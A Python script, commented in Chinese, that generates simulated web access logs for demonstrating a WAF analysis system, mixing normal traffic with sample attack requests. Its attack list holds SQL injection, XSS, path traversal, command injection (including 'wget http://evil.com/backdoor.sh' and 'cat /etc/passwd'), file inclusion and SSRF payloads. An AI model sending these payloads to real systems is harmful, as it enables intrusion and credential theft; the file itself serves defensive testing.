# -*- coding: utf-8 -*-
"""
生成模拟的 Web 访问日志, 用于演示 WAF 分析系统.
包含: 正常访问 + 各类攻击请求 (SQL注入/XSS/路径遍历/命令执行/SSRF/文件上传)
"""

import os
import random
from datetime import datetime, timedelta

# 写到脚本/运行所在目录, 避免写死绝对路径
OUTPUT = os.path.join(os.path.dirname(os.path.abspath(__file__)), "access.log")

# 正常 UA
NORMAL_UA = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/17.0",
    "Mozilla/5.0 (X11; Linux x86_64) Firefox/121.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) Mobile/15E148",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Edge/120.0",
]

# 正常请求
NORMAL_PATHS = [
    "/", "/index.html", "/about", "/products", "/api/v1/users",
    "/api/v1/orders?page=1", "/static/app.js", "/favicon.ico",
    "/api/v1/login", "/api/v1/search?q=python&page=2",
    "/api/v1/select_city",  # 含白名单关键词, 验证误报过滤
    "/api/v1/products/12345", "/cart", "/checkout",
]

# 攻击请求
ATTACK_PATHS = [
    # SQL注入
    "/api/v1/user?id=1 UNION SELECT username,password FROM admin",
    "/search?keyword=test' OR 1=1 -- ",
    "/api/v1/login?user=admin'--&pass=x",
    "/api/v1/data?id=1 AND SLEEP(5)",
    "/index.php?id=1/**/AND/**/1=1",
    # XSS
    "/comment?msg=<script>alert(document.cookie)</script>",
    "/search?q=<img src=x onerror=alert(1)>",
    "/profile?name=<iframe src=javascript:alert(1)>",
    # 路径遍历
    "/../../../../etc/passwd",
    "/api/v1/file?path=../windows/system32/config",
    "/backup/../config/web.config",
    # 命令执行
    "/api/v1/ping?host=127.0.0.1; cat /etc/passwd",
    "/api/v1/util?cmd=whoami",
    "/shell?exec=wget http://evil.com/backdoor.sh",
    # 文件上传/包含
    "/upload?filename=shell.php",
    "/include.php?file=php://input",
    # SSRF/扫描
    "/proxy?url=http://127.0.0.1/admin",
    "/.env",
    "/phpmyadmin/index.php",
]

# 攻击IP (少量IP集中攻击, 用于演示Top IP与攻击链)
ATTACK_IPS = [
    "203.0.113.45",   # 多阶段攻击者
    "198.51.100.23",  # 多阶段攻击者
    "192.0.2.88",
    "10.0.0.199",
]
NORMAL_IPS = [
    "114.114.114.10", "114.114.114.11", "114.114.114.12",
    "8.8.8.20", "8.8.8.21", "223.5.5.30",
    "223.5.5.31", "117.128.0.50",
]


def rand_time():
    base = datetime(2026, 9, 28, 10, 0, 0)
    return base + timedelta(minutes=random.randint(0, 600))


def fmt_time(dt):
    return dt.strftime("%d/%b/%Y:%H:%M:%S +0800")


def main():
    random.seed(42)
    lines = []

    # 正常流量
    for _ in range(400):
        ip = random.choice(NORMAL_IPS)
        path = random.choice(NORMAL_PATHS)
        ua = random.choice(NORMAL_UA)
        t = rand_time()
        method = "GET"
        if "login" in path or "cart" in path:
            method = "POST"
        lines.append(
            f'{ip} - - [{fmt_time(t)}] "{method} {path} HTTP/1.1" '
            f'200 1234 "-" "{ua}"'
        )

    # 攻击流量 (集中在少数IP, 形成攻击链)
    for i in range(60):
        ip = random.choice(ATTACK_IPS)
        path = random.choice(ATTACK_PATHS)
        ua = random.choice(NORMAL_UA)
        t = rand_time()
        method = "GET"
        if "upload" in path or "proxy" in path:
            method = "POST"
        lines.append(
            f'{ip} - - [{fmt_time(t)}] "{method} {path} HTTP/1.1" '
            f'403 0 "-" "{ua}"'
        )

    # 按时间排序, 写入
    lines.sort(key=lambda x: x.split("[")[1])
    with open(OUTPUT, "w", encoding="utf-8") as f:
        f.write("\n".join(lines) + "\n")

    print(f"✅ 已生成 {len(lines)} 条模拟日志 -> {OUTPUT}")
    print(f"   - 正常请求: ~400 条")
    print(f"   - 攻击请求: ~60 条 (来自 {len(ATTACK_IPS)} 个攻击IP)")


if __name__ == "__main__":
    main()
